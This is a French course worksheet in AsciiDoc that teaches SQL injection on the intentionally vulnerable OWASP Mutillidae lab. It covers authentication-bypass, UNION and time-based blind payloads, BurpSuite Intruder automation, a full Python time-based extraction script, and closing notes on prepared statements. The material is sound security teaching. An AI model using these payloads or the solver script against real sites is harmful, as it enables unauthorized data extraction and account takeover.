@@ -1,0 +1,608 @@
+= Sécurisation des applications Web : Activité 1 - Injections
+:authorinitials: Patrice Dignan & OWASP Mutillidae
+:author: Timothée Robert (portage ADOC et compléments)
+:toc: left
+:toc-title: Sommaire
+:icons: font
+:source-highlighter: rouge
+:imagesdir: images
+
+== I. Objectifs à atteindre
+
+* Comprendre la notion d'injection.
+* Réaliser les deux défis présentés.
+* Comprendre le code source des scripts PHP utilisés (version non sécurisée et version sécurisée).
+
+== II. Présentation de la notion d'injection
+
+=== 1. Définition de la notion d'injection
+
+Les défauts d'injection, tels que l'injection SQL ou l'injection LDAP, se produisent lorsque des données non attendues sont envoyées à un interpréteur en tant que commande ou requête.
+
+Ces données envoyées par l'attaquant peuvent entraîner l'exécution de commandes et ainsi permettre l'accès à des informations confidentielles. L'injection la plus connue reste l'injection SQL (SQLi).
+
+De nombreuses applications web travaillent autour d'un système de gestion de base de données (SGBDR) et comportent des formulaires qui attendent des données fournies par les utilisateurs. Si le développeur ne travaille que sur les scénarios attendus de saisies des données, il risque de ne pas intégrer de **contrôles de validation** (input validation) ce qui peut entraîner une sensibilité à l'injection.
+
+De nombreux outils permettent d'automatiser la détection et l'exploitation des vulnérabilités SQLi. On peut citer :
+
+* Burpsuite
+* Vega
+* SQLMAP
+* SQL ninja
+* Arachni
+* Script Engine de NMAP…
+
+=== 2. Exemple d'injection SQL (SQLi)
+
+De nombreux exemples d'injections SQL sont disponibles sur Internet. Prenons un exemple simple qui illustre le fonctionnement d'une requête SQL visant à compromettre le mot de passe d'un utilisateur.
+
+On considère le champ associé au *login* et le champ associé au *mot de passe*. On suppose que l'attaquant connaît le login de la victime (via ingénierie sociale par exemple).
+
+La saisie suivante peut être mise en place si le site est sensible aux injections SQL :
+
+* **Utilisateur** : `admin`
+* **Mot de passe** : ++' or 1=1 -- ++
+
+L'apostrophe indique la fin de la zone de frappe de l'utilisateur, le code `or 1` demande au script si 1 est vrai (ce qui est toujours le cas), et les doubles tirets indiquent le début d'un commentaire en SQL.
+
+En SQL standard (et MySQL), le double tiret doit obligatoirement être suivi d'une espace pour être interprété comme un commentaire. Sans l'espace, l'injection risque d'échouer selon la version de la BDD.
+
+L'alternative est d'utiliser à la place du double tiret le caractère dièse # qui est également un commentaire et n'a pas besoin d'être suivi d'un espace
+
+La requête SQL générée pourrait ressembler à ceci :
+
+[source,sql]
+----
+SELECT uid FROM Users WHERE Name = 'admin' AND Password = ' ' OR 1 -- ;
+----
+
+Le script devient ainsi programmé pour vérifier si ce que l'utilisateur saisit est vrai. Comme 1 est vrai, l'attaquant sera connecté en tant qu'administrateur.
+
+== III. Présentation des défis
+
+Deux défis sont à relever dans cette première activité.
+
+* **Défi 1 : Extraction de données** +
+Le but est d'obtenir la liste de tous les utilisateurs.
+
+* **Défi 2 : Passer outre une authentification** +
+Le but est de s'authentifier à l'aide du compte d'un autre utilisateur.
+
+== IV. Travaux préparatoires
+
+Il faut commencer par créer un compte sur Mutillidae. Pour cela, cliquer sur le lien *Login/register*.
+
+image::mutillidae-menu-login.png[Menu Login Register]
+
+Puis suivre le lien "Please register here".
+
+Une fois authentifié, une indication apparaît en haut à droite de l'écran. Cette indication permettra de vérifier si certains défis sont réalisés avec succès.
+
+image::mutillidae-logged-in-status.png[Statut connecté Patrice]
+
+
+Le niveau de sécurité du code mis en place est indiqué en haut de la page près des informations d'authentification.
+
+image::security-level-1.png[Security Level 0 Hosed]
+_Absence de contrôle de sécurité._
+
+image::security-level-1.png[Security Level 1 Client side]
+_Contrôles des informations saisies coté client._
+
+image::security-level-5.png[Security Level 5 Server side]
+_Contrôles des informations saisies coté serveur._
+
+Le niveau de sécurité du code mis en œuvre se modifie en cliquant sur le lien **Toggle Security**.
+
+image::btn-toggle-security.png[Bouton Toggle Security]
+
+Chaque niveau de sécurité est disponible sur le même script PHP. Ces scripts sont stockés sur le serveur dans le répertoire d’installation (ex: `c:\laragon\www\mutillidae` sous Windows).
+
+Pour les deux défis de cette activité, c'est le formulaire d'authentification qui servira de base de travail.
+
+image::formulaire-login.png[Formulaire de connexion]
+
+Certains défis nécessitent de connaître les noms des champs de formulaires utilisés. Cette information peut s'obtenir facilement en observant le code source de la page (CTRL + U).
+
+[source,html]
+----
+<td class="label">Username</td>
+<td>
+<input SQLInjectionPoint="1" type="text" name="username" size="20" autofocus="autofocus" minlength="1" maxlength="15" required="required" />
+----
+
+[TIP]
+.Bonne pratique Git
+====
+Avant de commencer à travailler, créez un fichier `.gitignore` à la racine de votre projet pour exclure les fichiers inutiles (fichiers de configuration de l'IDE `.idea/`, `.vscode/`, fichiers temporaires, etc.).
+====
+
+[NOTE]
+====
+Cette activité peut être réalisée sans utiliser l’outil **BurpSuite**. Toutefois, une première prise en main est recommandée pour trouver le nom des champs du formulaire.
+====
+
+**Première prise en main de l’outil BurpSuite :**
+
+BurpSuite peut être utilisé pour découvrir le nom des champs d’un formulaire.
+
+1.  Configurer le proxy du navigateur (voir annexes) sur `127.0.0.1:8080`.
+2.  Démarrer BurpSuite (`Temporary project` => `Use Burp defaults`).
+3.  Aller dans l’onglet **Proxy** > **Intercept**, vérifier que le proxy est désactivé (*Intercept is off*).
+4.  Aller sur la page *Login/Register* de Mutillidae.
++
+image::form-login.png[Login/Register]
++
+5.  Saisir un login et un mot de passe sans valider.
+6.  Dans BurpSuite, activer l'interception (*Intercept is on*).
+7.  Valider le formulaire sur le navigateur.
+8.  Dans BurpSuite, cliquer sur **Forward**. Le nom des champs est visible dans l'onglet **Inspector > Request body parameters**.
+
+image::burp-request-interception.png[Interception requête BurpSuite]
+
+**Consignes pour la suite :**
+
+1.  Créer un compte permettant de vous authentifier sur la plateforme.
+2.  Découvrir les noms des champs `login` et `mot de passe` du formulaire.
+3.  Positionner le niveau de sécurité du code à **0 (Hosed)**.
+
+== V. Découverte de la sensibilité SQLi
+
+Une fois les travaux préparatoires effectués, passons à la phase de découverte. La plateforme Mutillidae offre des pages sensibles à la faille SQLi (selon le niveau de sécurité).
+
+1.  Aller sur la page de connexion.
+2.  Vérifier que le niveau de sécurité est **0 (Hosed)**.
+3.  Saisir une simple quote `'` dans le champ mot de passe.
+
+image::input-sqli-quote.png[Insertion quote champ mot de passe]
+
+_Note : L'outil "Web developer" a été utilisé ici pour rendre le mot de passe visible, ce n'est pas indispensable._
+
+Lors du clic sur le bouton **Login**, une erreur apparaît dévoilant la sensibilité SQLi.
+
+image::sqli-error-message.png[Message erreur SQL Injection]
+
+Ce message d'erreur est particulièrement instructif pour une personne malveillante.
+
+== VI. A vous de jouer
+
+Le but est de relever les deux défis présentés précédemment. Une recherche sur Internet permet d'obtenir de nombreux exemples d'injections à tester.
+
+=== Premier défi : Extraction de données
+
+**Objectif :** Obtenir la liste de tous les utilisateurs.
+
+Pour lancer le défi, suivre le chemin : `OWASP 2017 => A1 – Injection (SQL) => SQLi – Extract Data => User Info (SQL)`.
+
+image::menu-user-info-sqli.png[Menu User Info SQLi]
+
+* Nom du script PHP : `user-info.php`.
+* Fonction : Affiche le détail des informations d'un compte utilisateur.
+
+image::form-user-info.png[Formulaire User Info]
+
+=== Deuxième défi : Passer outre une authentification
+
+**Objectif :** S'authentifier à l'aide du compte d'un autre utilisateur.
+
+Pour lancer le défi, suivre le chemin : `OWASP 2017 => A1 – Injection (SQL) => SQLi – Bypass Authentication => Login`.
+
+image::menu-bypass-auth.png[Menu Bypass Authentication]
+
+* Nom du script PHP : `login.php`.
+
+=== Réalisation des défis
+
+Tester les injections suivantes pour réaliser les défis :
+
+* `'or ('a' = 'a' ) or '`
+* `' or username='admin`
+
+Reporter sur votre documentation les injections testées et les résultats.
+
+=== Troisième défi : Extraction via UNION (UNION-Based SQLi)
+**Objectif :** Comprendre la structure des requêtes SQL pour extraire des données non prévues (version de la base, tables systèmes).
+
+**Le scénario :** Utiliser la page "User Info" pour récupérer le nom de la base de données actuelle et la version du SGBD.
+
+**Chemin d'accès :** `OWASP 2017` -> `A1 - Injection (SQL)` -> `SQLi - Extract Data` -> `User Info (SQL)`
+
+**Étapes à réaliser :**
+
+1.  **Trouver le nombre de colonnes :**
+L'opérateur `UNION` nécessite que les deux requêtes aient le même nombre de colonnes. Injectez `ORDER BY x` jusqu'à obtenir une erreur.
+* Payload test : ++' ORDER BY 1 -- ++ (puis 2, 3, 4, 5...)
+* *Question :* À quel chiffre l'application renvoie-t-elle un message avec une erreur "Unknown column" ? En déduire le nombre de colonnes.
+
+2.  **Identifier les colonnes affichables :**
+Trouver quelles colonnes de la requête SQL sont affichées sur la page web.
+* Payload : ++' UNION SELECT 1, 2, 3, 4 -- ++ (ajustez le nombre de chiffres selon l'étape précédente).
+* *Observation :* Repérez où les chiffres s'affichent à l'écran. Ce sont vos points d'exfiltration.
+
+3.  **Exfiltrer les données :**
+Remplacer les chiffres affichables par des fonctions systèmes MySQL.
+* Payload cible : ++' UNION SELECT 1, database(), version(), 4 -- ++
+* *Résultat :* Notez le nom de la base de données et la version de MySQL.
+
+==== Fonctions systèmes utiles pour l'extraction
+
+Une fois les colonnes d'affichage identifiées (par exemple les colonnes 2 et 3), vous pouvez remplacer les chiffres par des fonctions internes de MySQL pour récupérer des informations précieuses sur la cible.
+
+Voici les 4 fonctions les plus pertinentes à connaître :
+
+* `version()` (ou `@@version`) +
+**Utilité :** Affiche la version exacte du serveur MySQL (ex: `5.7.33-log`). +
+**Intérêt :** Permet à l'attaquant de rechercher des vulnérabilités spécifiques (CVE) connues pour cette version.
+
+* `database()` (ou `schema()`) +
+**Utilité :** Affiche le nom de la base de données actuellement utilisée (ex: `nowasp`). +
+**Intérêt :** Indispensable pour ensuite explorer les tables spécifiques ou construire des requêtes vers `information_schema`.
+
+* `user()` (ou `current_user()`) +
+**Utilité :** Affiche l'utilisateur SQL connecté et son hôte (ex: `root@localhost` ou `mutillidae@localhost`). +
+**Intérêt :** Permet de vérifier les privilèges. Si l'utilisateur est `root`, l'impact de l'attaque est critique (lecture/écriture de fichiers).
+
+* `@@datadir` +
+**Utilité :** Affiche le chemin absolu du répertoire de données sur le serveur (ex: `/var/lib/mysql/` sur Linux ou `C:\laragon\mysql\data\` sur Windows avec un Laragon). +
+**Intérêt :** Révèle le système d'exploitation (Windows vs Linux) et aide à localiser des fichiers sensibles.
+
+[TIP]
+.Astuce : Tout récupérer d'un coup
+====
+Si vous avez peu de colonnes affichables à l'écran (ce n'est pas le cas ici mais dans d'autres contextes), utilisez la fonction `concat_ws` (Concatenate With Separator) pour regrouper plusieurs informations dans un seul champ.
+
+*Payload exemple :*
+++' UNION SELECT 1, concat_ws(' | ', user(), database(), version()), 3, 4, 5, 6, 7, 8, 9, 10 #++
+
+*Résultat affiché :* `root@localhost | nowasp | 5.7.33`
+====
+
+====  **Bonus (Expert) :**
+Tenter d'afficher la liste des tables présentes dans la base via `information_schema`.
+
+* Indice : `FROM information_schema.tables`
+
+=== Complément BurpSuite : Optimiser l'attaque UNION
+
+L'attaque par injection UNION nécessite beaucoup d'essais-erreurs (trouver le nombre de colonnes, trouver les colonnes affichables, tester les fonctions...). Le faire directement dans la barre d'adresse du navigateur est fastidieux.
+
+Nous allons utiliser deux outils de BurpSuite pour gagner du temps.
+
+==== 1. Utiliser le "Repeater" pour tâtonner efficacement
+Le *Repeater* permet de modifier une requête et de la renvoyer manuellement autant de fois que nécessaire sans recharger la page web.
+
+**Manipulation :**
+
+1.  Assurez-vous que l'interception est activée dans BurpSuite.
+2.  Dans le navigateur (page User Info), saisissez une injection simple comme `test'` et validez.
+3.  Dans BurpSuite (onglet Proxy > Intercept), faites un clic droit sur la requête interceptée puis choisissez **Send to Repeater** (ou `CTRL + R`).
+4.  Allez dans l'onglet **Repeater**.
+5.  Modifiez le paramètre `username` directement dans la requête brute.
+* Test 1 : `username=admin'\+ORDER+BY+1+--+`
+* Cliquez sur **Send**.
+* Regardez la réponse dans la fenêtre de droite (onglet **Render** pour voir la page web, ou rechercher le texte "Error" dans l'onglet **Raw**).
+6.  Changez juste le chiffre (1 -> 5 -> 10) et relancez. C'est beaucoup plus rapide !
+
+image::burp-repeater-union.png[BurpSuite Repeater Action]
+
+[TIP]
+.Encodage des caractères
+====
+Dans le Repeater, vous devez parfois gérer l'encodage URL vous-même.
+Pour l'espace après les tirets (`-- `), remplacez-le par un `+` (plus standard dans les URL) :
+`... ORDER BY 1 --+`
+====
+
+==== 2. Utiliser l'"Intruder" pour trouver le nombre de colonnes (Automatisation)
+Plutôt que de tester 1, 2, 3... à la main, nous allons demander à BurpSuite de tester les colonnes 1 à 20 automatiquement.
+
+**Manipulation :**
+
+1.  Depuis votre requête dans le Proxy ou le Repeater, faites clic droit > **Send to Intruder** (ou `CTRL + I`).
+2.  Allez dans l'onglet **Intruder > Positions**.
+3.  Burp a peut-être surligné plein de choses. Cliquez sur **Clear §** pour tout effacer.
+4.  Modifiez votre injection pour préparer le terrain : `username=admin'\+ORDER+BY+1+--+`
+5.  Surlignez le chiffre `1` et cliquez sur **Add §**. Votre requête doit ressembler à :
+    `username=admin' ORDER BY §1§ --+`
+6.  Allez dans l'onglet **Payloads** :
+* **Payload type :** Numbers
+* **From :** 1
+* **To :** 20
+* **Step :** 1
+7.  Cliquez sur **Start Attack**.
+
+**Analyse des résultats :**
+Une nouvelle fenêtre s'ouvre avec un tableau. Regardez la colonne **Length** (taille de la réponse).
+* Toutes les réponses où le tri fonctionne auront la même taille (ex: 58600 octets).
+* La réponse où le tri échoue (erreur SQL) aura une taille différente (ex: 59680).
+* *Conclusion :* Le nombre de colonnes valides est le dernier chiffre avant que la taille ne change.
+
+image::burp-intruder-columns.png[BurpSuite Intruder Result]
+
+=== Quatrième défi : Injection en aveugle Temporelle (Time-Based Blind SQLi)
+
+**Contexte :**
+Vous devez sélectionner le menu : `OWASP 2017` -> `A1 - Injection (SQL)` -> `Blind SQL Via Timing` -> `User Info (SQL)`.
+
+Contrairement aux injections précédentes, ici l'application **n'affichera rien de différent** que la requête soit vraie ou fausse (ou n'affichera rien du tout). Le seul moyen de savoir si notre injection a fonctionné est de demander à la base de données de **faire une pause** (dormir) si la condition est vraie.
+
+**Étapes à réaliser (Manuellement) :**
+
+1.  **Vérifier la vulnérabilité (Le test du Sommeil) :**
+Nous allons demander à la base de données : "Si tu m'entends, dors pendant 5 secondes".
+* Payload MySQL : `admin' AND SLEEP(5) #`
+* *Observation :*
+* Si la page se charge immédiatement : L'injection a échoué.
+* Si la page met **5 secondes ou plus** à charger : L'injection a réussi ! Vous maîtrisez le temps d'exécution du serveur.
+
+2.  **La logique d'extraction (Vrai/Faux temporel) :**
+Nous allons poser une question à la base de données :
+"SI la première lettre de ton nom est 'a', ALORS dors 2 secondes, SINON réponds tout de suite."
+
+*Payload de test :*
+
+`admin' AND IF(substring(database(),1,1)='a', sleep(2), 0) #`
+
+=== Cinquième défi : Automatisation Time-Based avec Python
+
+**Objectif :** Automatiser l'attaque temporelle. Comme chaque test prend du temps, le faire à la main est impossible.
+
+**Consigne :**
+Écrire un script Python qui mesure le temps de réponse de chaque requête.
+
+Adaptez le script suivant pour trouver le nom de la BDD qui héberge la table de Login. Que fallait il changer ?
+
+[source,python]
+.Script de solution Time-Based (blind_time_solver.py)
+----
+import requests
+import string
+
+# --- CONFIGURATION ---
+BASE_URL = "http://localhost"
+LOGIN_URL = f"{BASE_URL}/index.php?page=login.php"
+TARGET_URL = f"{BASE_URL}/index.php?page=user-info.php"
+
+# Vos identifiants Mutillidae (ceux qui marchent dans le navigateur)
+USERNAME = "timo"
+PASSWORD = "Test@2030"  # Ou le mot de passe de votre compte
+
+# Caractères à tester
+chars = string.ascii_lowercase + string.digits + "-_"
+database_name = ""
+
+# Création d'une SESSION (c'est notre "navigateur" virtuel)
+# Elle va garder les cookies (PHPSESSID, uid, username) automatiquement entre les requêtes.
+s = requests.Session()
+
+# On ajoute un User-Agent pour ne pas se faire rejeter
+s.headers.update({
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+})
+
+
+def login():
+    print(f"[+] Tentative de connexion sur {LOGIN_URL}...")
+
+    # Données du formulaire de login
+    # Astuce : Il faut souvent inclure le nom du bouton submit pour que PHP traite le formulaire
+    login_data = {
+        "username": USERNAME,
+        "password": PASSWORD,
+        "login-php-submit-button": "Login"
+    }
+
+    try:
+        r = s.post(LOGIN_URL, data=login_data)
+
+        # Vérification simple : est-ce qu'on voit "Logged In User" ou le nom de l'user ?
+        if "Logged In User" in r.text or f"{USERNAME}" in r.text:
+            print("[OK] Connexion réussie ! Les cookies sont en mémoire.")
+            return True
+        else:
+            print("[ERREUR] Échec de la connexion. Vérifiez USERNAME/PASSWORD.")
+            # Debug : affiche un bout de la page pour comprendre
+            # print(r.text[:500])
+            return False
+    except Exception as e:
+        print(f"[ERREUR CRITIQUE] Impossible de joindre le serveur : {e}")
+        return False
+
+
+def attack():
+    global database_name
+    print(f"\n[+] Démarrage de l'attaque Time-Based SQLi sur {TARGET_URL}...")
+
+    for position in range(1, 10):
+        found_char = False
+        for char in chars:
+            # Payload : "Si la lettre est bonne, dors 2 secondes"
+            payload = f"admin' AND IF(substring(database(),{position},1)='{char}', sleep(2), 0) #"
+
+            data = {
+                "username": payload,
+                "password": "",
+                "user-info-php-submit-button": "View Account Details"
+            }
+
+            try:
+                # On utilise 's.post' (la session connectée) et non 'requests.post'
+                r = s.post(TARGET_URL, data=data)
+
+                if r.elapsed.total_seconds() > 2:
+                    database_name += char
+                    print(f"    [+] Lettre trouvée : {char} (Temps: {r.elapsed.total_seconds():.2f}s)")
+                    found_char = True
+                    break
+            except Exception as e:
+                print(f"Erreur : {e}")
+
+        if not found_char:
+            print("[-] Fin de la chaîne ou caractère non trouvé.")
+            break
+
+    print(f"\n[SUCCESS] Base de données : {database_name}")
+
+
+# --- EXÉCUTION ---
+if login():
+    attack()
+----
+
+== VII. Contre-mesures et Bilan
+
+=== 1. Analyse des vulnérabilités
+En modifiant le niveau de sécurité (Toggle Security à 1 ou 5), refaites les tests des défis précédents.
+Vous constaterez que les attaques `UNION` et `Blind` échouent.
+
+=== 2. Analyse du code source (user-info.php)
+En examinant le fichier `user-info.php` sécurisé, répondez aux questions :
+* Comment la fonction `mysql_real_escape_string()` (ou équivalent moderne `PDO::quote` ou requêtes préparées) neutralise-t-elle l'injection ?
+* Pourquoi le contrôle HTML (type="text") est-il inutile face à un attaquant utilisant BurpSuite ou Python ?
+
+=== 3. La solution ultime : Requêtes Préparées
+La seule protection robuste n'est pas de "nettoyer" les entrées (blacklist), mais de séparer **les données** du **code SQL**.
+C'est le rôle des **requêtes préparées (Prepared Statements)**.
+
+[source,php]
+.Exemple de code sécurisé (PDO)
+----
+$stmt = $pdo->prepare('SELECT * FROM accounts WHERE username = :username');
+$stmt->execute(['username' => $input_user]);
+$user = $stmt->fetch();
+----
+
+== VII. Contre-mesures
+
+La contre-mesure passe par la mise en place d'un codage sécurisé.
+
+1.  Modifier le niveau de sécurité (passer à 1 ou 5).
+2.  Vérifier que les tests d'exploitation des failles SQLi échouent.
+3.  En examinant le fichier `user-info.php` (avec PHPStorm ou VSCode), répondre aux questions suivantes :
+* Quel niveau de sécurité est nécessaire pour protéger contre cette attaque ?
+* A ce niveau, quels sont les contrôles réalisés ?
+* Est-ce que le contrôle HTML aurait suffi à protéger contre cette injection SQL ?
+* Comment la validation Javascript est-elle déclenchée ?
+* Quels sont les contrôles réalisés par la validation Javascript ?
+
+[appendix]
+== ANNEXES : MISE EN PLACE
+
+=== A. Installation de Mutillidae
+
+==== Pré-requis pour Windows (Laragon)
+1.  Copier le répertoire fourni mutillidae dans un sous répertoire de Laragon (ex: `c:\laragon\www\mutillidae`).
+2.  Changer éventuellement le Document Root sur Laragon.
+
+==== Pré-requis pour Linux
+Installation sur Debian 12 ou similaire via VirtualBox.
+
+Installer les paquets nécessaires :
+[source,bash]
+----
+apt install php7.0-xml libapache2-mod-php php-mysql mysql-server apache2 apache2-utils php-xml php-gd php-imap php-gettext php-curl zip
+----
+
+Configuration de la base de données :
+[source,bash]
+----
+mysql
+----
+
+Dans la console MySQL/MariaDB :
+[source,sql]
+----
+CREATE USER 'mutillidae'@'localhost' IDENTIFIED BY 'password';
+GRANT ALL PRIVILEGES ON *.* to 'mutillidae'@'localhost';
+FLUSH PRIVILEGES;
+----
+
+==== Téléchargement et installation
+Télécharger la dernière version :
+[source,bash]
+----
+wget https://sourceforge.net/projects/mutillidae/files/mutillidae-project/LATEST-mutillidae-2.6.62.zip
+----
+
+Décompresser dans le dossier web (`/var/www/html/` généralement).
+
+==== Initialisation
+Accéder à l'URL : `http://localhost/mutillidae`.
+
+* Sur Linux, si page blanche : `service apache2 restart`.
+* Sur Windows : démarrer Laragon.
+
+Si le message "Database offline" apparaît :
+
+image::db-offline-warning.png[Erreur Database Offline]
+
+Cliquer sur le lien **setup/reset the DB**.
+
+image::mutillidae-homepage.png[Page accueil Mutillidae]
+
+=== B. Préparation de BurpSuite
+
+==== Présentation
+BurpSuite (PortSwigger) est une plateforme de test de sécurité web jouant le rôle de proxy entre le navigateur et le serveur. Il permet d'intercepter, analyser et modifier les requêtes.
+
+image::schema-proxy-burp.png[Schéma fonctionnement Proxy]
+
+==== Installation
+
+**Sur Windows :** Exécuter l'installeur `burpsuite_community_windows-x64_vXXXX.exe`.
+
+**Sur Linux :**
+Télécharger la version Community (script `.sh`) depuis le site PortSwigger.
+Rendre le script exécutable et l'installer :
+
+[source,bash]
+----
+chmod +x burpsuite_community_linux_v1_7_32.sh
+sh burpsuite_community_linux_v1_7_32.sh
+----
+
+image::install-burp-linux.png[Installation Burp Linux]
+
+==== Configuration du navigateur
+
+Le navigateur doit être configuré pour utiliser le proxy local.
+
+**Paramètres Proxy :**
+* IP : `127.0.0.1`
+* Port : `8080`
+
+*Exemple sous Windows :*
+
+image::windows-proxy-settings.png[Config Proxy Windows]
+
+*Exemple sous Firefox :*
+(Menu Paramètres > Réseau > Paramètres)
+
+image::firefox-proxy-settings.png[Config Proxy Firefox]
+
+image::firefox-proxy-settings2.png[Config Proxy Firefox]
+
+
+==== Première capture
+
+1.  Lancer BurpSuite > **Temporary Project** > **Use Burp defaults**.
+2.  Onglet **Proxy** > **Intercept**.
+3.  Vérifier que le bouton indique **Intercept is on**.
+4.  Naviguer sur le web : la requête s'affiche dans Burp.
+5.  Cliquer sur **Forward** pour relâcher la requête.
+
+image::burp-interface-intercept.png[Interface Burp Intercept]
+
+Il faut ensuite cliquer sur temporary project.,
+
+Puis un autre clic sur suivant et enfin sur burp defaults.
+
+Enfin, il faut cliquer sur le bouton Start Burp.
+
+Sous Linux, le répertoire d'installation de BurpSuite se situe par défaut dans /usr/local/BurpSuiteCommunity. Pour effectuer une première interception de requête, il faut cliquer sur l'onglet Proxy, puis sur Intercept et vérifier la présence du bouton intercept is on.
+
+Lors de l'accès à un site depuis le navigateur, chaque requête est capturée par BurpSuite. Le clic sur le bouton Forward permet de passer à la requête suivante. En attendant ce clic, le proxy se met en attente avant d'envoyer les données vers le serveur web.
+
+Pour désactiver la capture, il suffit de cliquer sur ‘intercept is on’.
+
+image::intercept-on.png[Désactivation]
